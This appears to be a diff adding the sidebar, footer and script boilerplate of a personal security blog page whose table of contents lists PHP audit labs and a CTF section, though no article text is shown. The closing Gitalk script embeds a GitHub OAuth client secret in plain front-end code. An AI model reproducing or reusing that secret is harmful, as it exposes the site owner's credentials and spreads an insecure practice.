+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP-Audit-Labs"><span class="nav-number">1.</span> <span class="nav-text">PHP-Audit-Labs</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#实例分析"><span class="nav-number">2.</span> <span class="nav-text">实例分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CTF"><span class="nav-number">3.</span> <span class="nav-text">CTF</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.4m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">21:52</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
